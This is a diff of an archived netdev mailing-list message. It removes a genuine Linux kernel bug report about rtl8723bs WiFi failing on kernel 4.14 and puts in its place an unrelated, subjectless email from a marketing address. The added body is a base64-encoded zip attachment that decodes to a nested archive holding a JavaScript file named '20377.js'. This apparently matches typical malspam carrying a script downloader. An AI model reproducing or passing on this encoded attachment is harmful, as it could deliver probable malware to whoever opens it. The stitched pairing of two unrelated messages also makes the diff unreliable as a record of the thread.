@@ -1,37 +1,68 @@
-From: =?utf-8?B?0JzQuNGF0LDQuNC7INCd0L7QstC+0YHQtdC70L7Qsiwg0KjQrdCcINCU0YPQvNCw0LvQvtCz0LjRjw==?=
-        <mikhailnov@dumalogiya.ru>
-Subject: [REGRESSION] rtl8723bs (r8723bs) WiFi stopped working on 4.14 on Chuwi Hi12 (Intel CherryTrail SoC)
-Date: Sun, 15 Oct 2017 16:37:40 +0300
-Message-ID: <2750281508074660@web27g.yandex.ru>
+From: <marketing@chinesport.it>
+Subject: (unknown)
+Date: Sun, 15 Oct 2017 13:57:40 -0000
+Message-ID: <150807586031.32756.14528031090800665218@microweb.hu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 8bit
-To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
+Content-Type: application/zip; name="29848250.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from forward101p.mail.yandex.net ([77.88.28.101]:52140 "EHLO
-        forward101p.mail.yandex.net" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1751096AbdJONpX (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Sun, 15 Oct 2017 09:45:23 -0400
-Received: from mxback4o.mail.yandex.net (mxback4o.mail.yandex.net [IPv6:2a02:6b8:0:1a2d::1e])
-        by forward101p.mail.yandex.net (Yandex) with ESMTP id 06FB86A823C0
-        for <netdev@vger.kernel.org>; Sun, 15 Oct 2017 16:37:41 +0300 (MSK)
+Received: from subscr-188.pool-180.microweb.hu ([46.31.180.188]:40106 "HELO
+        microweb.hu" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750854AbdJON5m (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sun, 15 Oct 2017 09:57:42 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-Hello,
-I've found a regression in kernel 4.14, the last tested kernel was the yesterday daily build http://kernel.ubuntu.com/~kernel-ppa/mainline/daily/ , it worked on 4.12 and 4.13 and now on 4.14 it is able to scan for available networks, but is not able to get an IP adress.
-I reported a bug to the kernel's bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=197137 
----------------------------------------------------------------------------------
-
-Hardware platform: Chuwi Hi12 (intell cherrytrail tablet)
-On Linux kernels 4.12 and 4.13 the WiFi does work, starting from 4.14 not release builds it does not, including some dily builds of the times somewhere near rc1, the rc3 release and the letest daily build of the code state for 2017-10-04 http://kernel.ubuntu.com/~kernel-ppa/mainline/daily/2017-10-05/ 
-I will provide logs from 4.14 a bit later, bellow are LOGS FROM 4.13.1 with working WiFi
-
-Full information on hardware and logs (including full dmesg) are here: https://linux-hardware.org/index.php?probe=01521aa6cf (kernel 4.13 and working wifi)
-
-$ dmesg | grep rtl
-[    7.899105] RTL8723BS: rtl8723bs v4.3.5.5_12290.20140916_BTCOEX20140507-4E40
-[    7.899106] RTL8723BS: rtl8723bs BT-Coex version = BTCOEX20140507-4E40
-[   10.570755] rtl8723bs: acquire FW from file:rtlwifi/rtl8723bs_nic.bin
-
-Logs from 4.14 with WiFi not working: https://linux-hardware.org/index.php?probe=5c7b00c4cb
+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
+AVBLBQYAAAAAAQABAFsAAACPCgAAAAA=
